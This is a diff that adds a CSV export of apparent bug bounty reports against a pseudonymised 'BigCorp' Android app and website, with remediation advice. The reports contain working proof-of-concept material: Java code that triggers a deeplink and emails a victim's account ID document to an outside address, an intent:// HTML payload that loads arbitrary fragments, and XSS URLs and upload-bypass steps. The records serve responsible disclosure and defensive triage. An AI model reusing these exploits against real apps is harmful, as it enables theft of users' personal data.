@@ -1,0 +1,353 @@
+reference_number,bounty_code,source,username,title,caption,priority,amount,points,paid_at,vrt_lineage,substate,state,duplicate,bug_url,description,http_request,extra_info,submitted_at,validated_at,closed_at,target_name,target_category,remediation_advice,vulnerability_references
+ab81a5ea23230b0aa8e259c8749b76c390acbf1f6856c594319caaeizit9zah5,bigcorp,platform,Haxor-01,Steal files with BigCorp deeplinks exploited by third party apps on Android,Steal files with BigCorp deeplinks exploited by third party apps on Android,2,900,20,2020-01-11 10:58:24 UTC,Insecure Data Storage > Sensitive Application Data Stored Unencrypted > On External Storage,unresolved,open,FALSE,bigcorpapp://launch/autoid,"Hello,
+
+I found a way to access sensitive files with third party applications using BigCorp deeplinks effectively bypassing authentication (Uses persisted session from a logged in account) and CSRF protections. I've created a PoC that ex-filtrates files in three steps.
+
+This would not be possible via web access because of CSRF protections. On mobile this acts as a shortcut to downloading Account ID cards without having to navigate to the Account section of the mobile application.
+
+### Impact
+
+BigCorp users can be tricked into having their sensitive data stolen via access to deeplinks by third party apps. Any document that is auto-downloaded can be ex-filtrated with the PoC provided. It's very common for apps to have sessions stay open after login and this exploit chain leverages that feature.
+
+So far I've been able to expose the following information from my account: Full name, Account type, Account ID number, Sales Code, Phone Number. 
+
+---
+
+### Steps to reproduce
+
+1. Log into the BigCorp mobile app and open my PoC app to automate the rest of the steps
+
+### How the exploit chain works
+
+2. Use the following deeplink by transferring this html to the Android device with `adb push bigcorp-deeplink-poc.html /sdcard/Download`.
+
+```
+<html>
+<p class=""p2"">- <a href=""bigcorpapp://launch/autoid"">autoid</a></p>
+</html
+```
+3 . The account information including full name and account ID number automatically download to `sdcard/Android/data/com.bigcorp.mobile.android.bigcorp/files/BIGCORP_DOCS/`
+
+4 . This confirms that all request origins are accepted and allow files to be downloaded automatically.
+
+5 . My PoC app downloads MbAutoIdCardsServlet.pdf to a public shareable directory -> copies the file and moves it to `/storage/emulated/0/Download/` -> Finally the app sends the document via email. Note: Step 3 can be completed automated with Javamail in Android. [https://medium.com/@ssaurel/how-to-send-an-email-with-javamail-api-in-android-2fc405441079](https://medium.com/@ssaurel/how-to-send-an-email-with-javamail-api-in-android-2fc405441079)
+
+---
+
+### PoC code
+
+```java
+package hazor.bigcorp_poc;
+
+import android.annotation.TargetApi;
+import android.content.Intent;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Bundle;
+
+import android.os.Handler;
+import android.os.StrictMode;
+import android.support.v7.app.AppCompatActivity;
+import android.util.Log;
+
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.InputStream;
+import java.io.OutputStream;
+
+
+
+public class MainActivity extends AppCompatActivity {
+
+    private static final String TAG = ""PoCActivity"";
+    String dir = ""sdcard/Android/data/com.bigcorp.mobile.android.bigcorp/files/BIGCORP_DOCS/"";
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        StrictMode.VmPolicy.Builder builder = new StrictMode.VmPolicy.Builder(); StrictMode.setVmPolicy(builder.build());
+        if (shouldAskPermissions()) {
+            askPermissions();
+        }
+        //Step 1
+        requestDeeplink();
+        //Step 2
+        Handler handler = new Handler();
+        handler.postDelayed(new Runnable() {
+            public void run() {
+                Log.i(TAG, ""Starting file move"");
+                moveFile(dir, ""MbAutoIdCardsServlet.pdf"", ""/storage/emulated/0/Download/"");
+            }
+        }, 10000);
+        //Step 3
+        handler.postDelayed(new Runnable() {
+            public void run() {
+                Log.i(TAG, ""Starting file send"");
+                sendToEmail(""/storage/emulated/0/Download/"", ""AccountIDCardsServlet.pdf"");
+            }
+        }, 10000);
+    }
+
+    private void requestDeeplink() {
+        Uri uri = Uri.parse(""bigcorpapp://launch/autoid"");
+        Intent startDownloadIntent = new Intent(Intent.ACTION_VIEW, uri);
+        startActivity(startDownloadIntent);
+    }
+
+    private void moveFile(String inputPath, String inputFile, String outputPath) {
+
+        InputStream in = null;
+        OutputStream out = null;
+        try {
+
+            //create output directory if it doesn't exist
+            File dir = new File (outputPath);
+            if (!dir.exists())
+            {
+                dir.mkdirs();
+            }
+
+
+            in = new FileInputStream(inputPath + inputFile);
+            out = new FileOutputStream(outputPath + inputFile);
+
+            byte[] buffer = new byte[1024];
+            int read;
+            while ((read = in.read(buffer)) != -1) {
+                out.write(buffer, 0, read);
+            }
+            in.close();
+            in = null;
+
+            // write the output file
+            out.flush();
+            out.close();
+            out = null;
+
+            // delete the original file
+            new File(inputPath + inputFile).delete();
+
+
+        }
+
+        catch (FileNotFoundException fnfe1) {
+            Log.e(""tag"", fnfe1.getMessage());
+        }
+        catch (Exception e) {
+            Log.e(""tag"", e.getMessage());
+        }
+
+    }
+
+    private void sendToEmail(String folder_name, String file_name) {
+        try {
+            Intent intent = new Intent(Intent.ACTION_SENDTO);
+            intent.setType(""text/plain"");
+            String message=""File to be shared is "" + file_name + ""."";
+            intent.putExtra(Intent.EXTRA_SUBJECT, ""Subject"");
+            intent.putExtra(Intent.EXTRA_STREAM, Uri.parse( ""file:///"" + folder_name + file_name));
+            intent.putExtra(Intent.EXTRA_TEXT, message);
+            intent.setData(Uri.parse(""mailto:hazor@example.com""));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+
+            startActivity(intent);
+            
+        } catch(Exception e)  {
+            System.out.println(""is exception raises during sending mail"" + e);
+        }
+    }
+    protected boolean shouldAskPermissions() {
+        return (Build.VERSION.SDK_INT > Build.VERSION_CODES.LOLLIPOP_MR1);
+    }
+
+    @TargetApi(23)
+    protected void askPermissions() {
+        String[] permissions = {
+                ""android.permission.READ_EXTERNAL_STORAGE"",
+                ""android.permission.WRITE_EXTERNAL_STORAGE""
+        };
+        int requestCode = 200;
+        requestPermissions(permissions, requestCode);
+    }
+
+}
+
+```
+
+---
+
+### How to fix
+
+Some ideas on how to fix this.
+
+1. Check origin of the deeplink request and only allow requests from bigcorp.com or mobile apps
+
+2. Download files to a non-public directory like `/data/data/com.bigcorp.mobile.android.bigcorp/cache/*` 
+
+3. Restrict app's protected folders and URIs
+
+Please let me know if you have any questions!
+",,,2020-03-01 06:15:06 UTC,2020-03-04 16:09:59 UTC,,BigCorp Mobile Application for Android,android,"1. Never store sensitive application data unencrypted.
+2. Use the strongest encryption algorithms such as AES with a minimum of a 256-bit key size for application data storage.","* [https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cryptographic_Storage_Cheat_Sheet.md](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cryptographic_Storage_Cheat_Sheet.md)
+* [https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure](https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure)
+* [https://cwe.mitre.org/data/definitions/312](https://cwe.mitre.org/data/definitions/312)
+* [https://cwe.mitre.org/data/definitions/729](https://cwe.mitre.org/data/definitions/729)
+* [https://cwe.mitre.org/data/definitions/922](https://cwe.mitre.org/data/definitions/922)"
+jangoo9aijdd38d85d0e862de1a8b0e11e20af5551cbe57af5effd407fb1e455,bigcorp,platform,Haxor-02,[BigCorp Android] Remote access to arbitrary fragments,[BigCorp Android] Remote access to arbitrary fragments,2,1000,20,2018-09-22 16:11:46 UTC,Broken Access Control (BAC),unresolved,open,FALSE,,"Hi, attacker can remotely (without installing any third-party apps, e.g. directly from a web browser) access arbitrary existing fragments and attack their functionality.
+
+The problem is in ``` com/bigcorp/mobile/android/app/core/BaseActivity.java ``` which is superclass for exported components (e.g. ``` com.bigcorp.mobile.android.app.marketing.MarketingUniversalLinkActivity ```)
+```java
+	    private void determineDeepDive() {
+	        if (getIntent().getBooleanExtra(""isDeepDive"", false)) { // attacker provided value
+	            java.lang.String stringExtra = getIntent().getStringExtra(""targetFragment""); // attacker provided class for launching fragment
+	            if (!android.text.TextUtils.isEmpty(stringExtra)) {
+	                try {
+	                    java.lang.Class cls = java.lang.Class.forName(stringExtra);
+	                    if (cls != null) {
+	                        java.lang.Object newInstance = cls.newInstance();
+	                        if (newInstance instanceof android.support.v4.app.Fragment) {
+	                            ((android.support.v4.app.Fragment) newInstance).setArguments(getIntent().getExtras()); // arguments for the fragment is also attacker provided in the same intent
+	                        }
+	                        this.hasAddedDeepFragment = false;
+	                        setupFragment(newInstance); // fragment is launched
+```
+
+PoC (from a web-browser):
+```html
+<!DOCTYPE html>
+<html>
+<head><title>Example page</title></head>
+<body style=""text-align: center;"">
+    <h1><a href=""intent://www.bigcorp.com/pages/account_main#Intent;scheme=https;B.isDeepDive=true;S.url=http%3A%2F%2Fbase64.ru%2F;S.targetFragment=com.bigcorp.mobile.android.inf.webview.WebFragment;end"">Begin Check!</a></h1>
+</body>
+</html>
+```
+(online URL https://s3.amazonaws.com/haxors4tw/doh.html)
+
+Once user taps on ``` Begin Check! ``` BigCorp app is automatically opened with ``` com.bigcorp.mobile.android.inf.webview.WebFragment ```.
+
+You may want to build your own exploits against other fragments, use the following code for that:
+```java
+        Intent intent = new Intent();
+        intent.setData(Uri.parse(""https://www.bigcorp.com/pages/account_main""));
+        intent.putExtra(""isDeepDive"", true);
+        intent.putExtra(""targetFragment"", ""com.bigcorp.mobile.android.inf.webview.WebFragment"");
+        intent.putExtra(""url"", ""http://base64.ru/"");
+        Log.d(""Doh"", intent.toUri(Intent.URI_INTENT_SCHEME));
+```
+and put the string to ``` <a href=""..."" ```
+
+Full list of vulnerable fragments can be retrieved by command
+```
+grep android.support.v4.app.Fragment -r . | grep extends
+```
+I found 129 candidates",,,2018-09-19 19:46:16 UTC,2018-09-25 18:32:22 UTC,,BigCorp Mobile Application for Android,android,,* [https://cwe.mitre.org/data/definitions/723](https://cwe.mitre.org/data/definitions/723)
+d44b95d792de018373be4ff3425d22159217be7552b902ba1f3030ohbie2ve1w,bigcorp,platform,Haxor-03,Bypassing file upload filter for potential XSS,Bypassing file upload filter for potential XSS,3,400,10,2020-02-28 18:19:34 UTC,Cross-Site Scripting (XSS),unresolved,open,FALSE,https://www.bigcorp.com/ActivityList/ActivityList?3&activityTypeCd=DOCUPLD&activityId=74140DOCUPLD1048758188&wa_ref=cntr_quicklinks_checklist_ref,"Right after signing up for your service you are requested to submit a few documents for verification. This upload seems to be slightly different from the normal document upload function, specifically that it should allow less filetypes by default 
+![image.png](https://bugcrowd.com/embed/bc32510e-do5b-4623-987c-f01db42364bc/74ab0923-6195-413f-b097-5c4ffedd4867 ""image.png"") compared to the normal document upload ![normal.png](https://bugcrowd.com/embed/bc32510e-do5b-4623-987c-f01db42364bc/b2bac822-c7b5-a44a-9473-42a781f734ec ""normal.png""). But it appears that the validation on the normal file upload is much better than the one on the verification file upload this is targeting.
+
+It appears that in the POST request that uploads the file the ""Content-type:"" header in the multipart form is completely ignored, as is the file ending. The verification is done by checking the first few bytes of the file to decide if it should be uploaded. Once it is uploaded im not 100% confident what happens, it appears that after it is checked and uploaded the actual file type is decided by the file ending instead of the mimetype. This results in being able to upload arbitrary content, BUT most of them just get reflected as content type ""Octet-stream"". I have found that .html works just fine and is loaded as a valid html document.
+
+#Steps to reproduce:
+1. Register a new account via the signup form. (Note: It might be required to select that you have a medical background, since the file upload is labeled medical verification)
+2. Once logged in to your account, skip the ""tour"" and click your name in the top right, then select ""Send Documents to BigCorp"" from the dropdown menu.
+3. You should see the following ![req_docs.png](https://bugcrowd.com/embed/bc32510e-do5b-4623-987c-f01db42364bc/12b40c5c-2866-4735-8e02-8ccd222bba29 ""req_docs.png"")
+4. Click start upload and upload the file i provided ![Haxor-03.gif](https://bugcrowd.com/embed/bc32510e-do5b-4623-987c-f01db42364bc/2f6a3da1-c477-f147-5749-5c8d47451204 ""Haxor-03.gif"") , which is a GIF/html polyglot to bypass the mime check
+5. Intercept the request for the file upload and change the filename from ""Haxor-03.gif"" to ""Haxor-03.html"", the file should upload successfully.
+6. Open the uploaded file still called ""Haxor-03.gif"" in a new tab and watch the XSS pop ![xss_pop.png](https://bugcrowd.com/embed/bc32510e-do5b-4623-987c-f01db42364bc/827d50bb-7925-45d7-c54a-22e2919717d1 ""xss_pop.png"")
+
+I havent found a way to share the link in any way with another user to attack another user, or havent found a way to bypass the implemented security measure.
+This is where i have to rely on the good faith of your security team.
+My assumption here is that on your end the support is running either the same webapp with more admin features or a different webapp to check the attachments we send you. Since you should only receive the named document formats which are more or less safe, i would assume that the support employee would open the attachment without worries, in this case executing the malicious html file still called ""Haxor-03.gif"" essentially executing arbitrary javascript in your support app.
+
+I would feel bad confirming this myself since i only have 10 real chances per account to exploit this and maybe get a callback from the executed javascript, essentially having to create multiple accounts and spamming support to achieve this. Or somehow figure out what software you run on the backend, which would most likely also involve unwanted spam to the support.
+
+So in a best case scenario this is a XSS on your internal app with a high to critical impact, or a simple filter bypass with low impact. Which should be fixed either way.",,"If you need any more information please tell me and i'll do my best to answer.
+In the meantime i will try to find more ways this could be abused.",2020-01-12 03:27:14 UTC,2020-01-27 02:53:00 UTC,,www.bigcorp.com,website,"1. Always treat all user input as untrusted data.
+2. Never insert untrusted data except in allowed locations.
+3. Always input or output-encode all data coming into or out of the application.
+4. Always whitelist allowed characters and seldom use blacklisting of characters except in certain use cases.
+5. Always use a well-known and security encoding API for input and output encoding such as the `OWASP ESAPI`.
+6. Never try to write input and output encoders unless absolutely necessary. Chances are that someone has already written a good one.
+7. Never use the DOM function `innerHtml` and instead use the functions `innerText` and `textContent` to prevent against DOM-based XSS.
+8. As a best practice, consider using the `HTTPOnly` flag on cookies that are session tokens or sensitive tokens.
+9. As a best practice, consider implementing `Content Security Policy` to protect against XSS and other injection type attacks.
+10. As a best practice, consider using an auto-escaping templating system.
+11. As a best practice, consider using the `X-XSS-Protection` response header.","* [https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)](https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS))
+* [https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
+* [https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md)
+* [http://projects.webappsec.org/Cross-Site+Scripting](http://projects.webappsec.org/Cross-Site+Scripting)
+* [https://www.cvedetails.com/vulnerability-list/opxss-1/xss.html](https://www.cvedetails.com/vulnerability-list/opxss-1/xss.html)
+* [https://cwe.mitre.org/data/definitions/79](https://cwe.mitre.org/data/definitions/79)"
+gie9abee0o548a196021761b8de0dfc66794553b2c1ea5f4d804eb73b8dd7f08,bigcorp,platform,Haxor-04,Reflected XSS [token] – vendors.bigcorp.com,Reflected XSS [token] – vendors.bigcorp.com,3,400,10,2018-08-24 16:21:46 UTC,Cross-Site Scripting (XSS) > Reflected > Non-Self,unresolved,open,FALSE,,"# Steps to reproduce
+Just visit the following URL in Firefox: `https://www.vendors.bigcorp.com/logon_partner/Logon?tok=%3E%3Cabc%20onbeforescriptexecute=%27confirm(document.domain)%27%3E`.",,,2018-07-24 09:01:01 UTC,2018-07-24 17:42:11 UTC,,vendors.bigcorp.com,other,"1. Always treat all user input as untrusted data.
+2. Never insert untrusted data except in allowed locations.
+3. Always input or output-encode all data coming into or out of the application.
+4. Always whitelist allowed characters and seldom use blacklisting of characters except in certain use cases.
+5. Always use a well-known and security encoding API for input and output encoding such as the `OWASP ESAPI`.
+6. Never try to write input and output encoders unless absolutely necessary. Chances are that someone has already written a good one.
+7. Never use the DOM function `innerHtml` and instead use the functions `innerText` and `textContent` to prevent against DOM-based XSS.
+8. As a best practice, consider using the `HTTPOnly` flag on cookies that are session tokens or sensitive tokens.
+9. As a best practice, consider implementing `Content Security Policy` to protect against XSS and other injection type attacks.
+10. As a best practice, consider using an auto-escaping templating system.
+11. As a best practice, consider using the `X-XSS-Protection` response header.","* [https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)](https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS))
+* [https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
+* [https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
+* [http://projects.webappsec.org/Cross-Site+Scripting](http://projects.webappsec.org/Cross-Site+Scripting)
+* [https://www.cvedetails.com/vulnerability-list/opxss-1/xss.html](https://www.cvedetails.com/vulnerability-list/opxss-1/xss.html)
+* [https://cwe.mitre.org/data/definitions/79](https://cwe.mitre.org/data/definitions/79)"
+gie9abee0oa16354838a8af71dedc323b3f8268863250fe01b6000b0gie9abee0o,bigcorp,platform,Haxor-02,[BigCorp Android] Opening arbitrary URLs/XSS in WebActivity,[BigCorp Android] Opening arbitrary URLs/XSS in WebActivity,4,100,5,2018-11-11 11:41:41 UTC,Cross-Site Scripting (XSS),unresolved,open,FALSE,,"Hi, activity ``` com.bigcorp.mobile.android.app.core.webview.WebActivity ``` is exported and can be accessed by any third-party apps installed on the same device
+```xml
+	        <activity android:name=""com.bigcorp.mobile.android.app.core.webview.WebActivity"" android:configChanges=""keyboardHidden|orientation|screenSize"" android:windowSoftInputMode=""adjustPan"" android:parentActivityName=""com.bigcorp.mobile.android.app.common.MyBigCorpActivity"">
+	            <meta-data android:name=""android.support.PARENT_ACTIVITY"" android:value=""com.bigcorp.mobile.android.app.common.MyBigCorpActivity""/>
+	            <intent-filter>
+	                <action android:name=""com.bigcorp.action.smartlink""/>
+	                <category android:name=""android.intent.category.DEFAULT""/>
+	                <data android:scheme=""https""/>
+	                <data android:host=""*.bigcorp.com""/>
+	                <data android:path=""/ent_message/MessageMainPage/AccountsView""/>
+	            </intent-filter>
+	            ...
+	        </activity>
+```
+
+File ``` com/bigcorp/mobile/android/app/core/webview/WebActivity.java ```
+```java
+    protected void mo11837a(android.content.Intent intent) {
+        if (intent == null) {
+            intent = getIntent();
+        }
+        if (intent.getStringExtra(""Url"") != null) {
+            this.f7218d = com.bigcorp.mobile.android.inf.utils.C2624p.m12188c(intent.getStringExtra(""Url"")); // retrieving attacker provided data
+```
+```java
+	            if (com.bigcorp.mobile.android.inf.utils.C2622n.m12164a(this.f7219e)) {
+	                this.f7215a.loadUrl(this.f7218d, com.bigcorp.mobile.android.inf.services.p063c.C2598b.m11973a()); // launching browser
+```
+
+PoC:
+```java
+        Intent intent = new Intent();
+        intent.setClassName(""com.bigcorp.mobile.android.bigcorp"",
+                ""com.bigcorp.mobile.android.app.core.webview.WebActivity"");
+        intent.putExtra(""Url"", ""http://base64.ru"");
+        startActivity(intent);
+```
+APK is attached. Result is also shown on the attached screenshot",,,2018-09-18 20:13:37 UTC,2018-09-25 18:23:18 UTC,,BigCorp Mobile Application for Android,android,"1. Always treat all user input as untrusted data.
+2. Never insert untrusted data except in allowed locations.
+3. Always input or output-encode all data coming into or out of the application.
+4. Always whitelist allowed characters and seldom use blacklisting of characters except in certain use cases.
+5. Always use a well-known and security encoding API for input and output encoding such as the `OWASP ESAPI`.
+6. Never try to write input and output encoders unless absolutely necessary. Chances are that someone has already written a good one.
+7. Never use the DOM function `innerHtml` and instead use the functions `innerText` and `textContent` to prevent against DOM-based XSS.
+8. As a best practice, consider using the `HTTPOnly` flag on cookies that are session tokens or sensitive tokens.
+9. As a best practice, consider implementing `Content Security Policy` to protect against XSS and other injection type attacks.
+10. As a best practice, consider using an auto-escaping templating system.
+11. As a best practice, consider using the `X-XSS-Protection` response header.","* [https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)](https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS))
+* [https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
+* [https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
+* [http://projects.webappsec.org/Cross-Site+Scripting](http://projects.webappsec.org/Cross-Site+Scripting)
+* [https://www.cvedetails.com/vulnerability-list/opxss-1/xss.html](https://www.cvedetails.com/vulnerability-list/opxss-1/xss.html)
+* [https://cwe.mitre.org/data/definitions/79](https://cwe.mitre.org/data/definitions/79)"
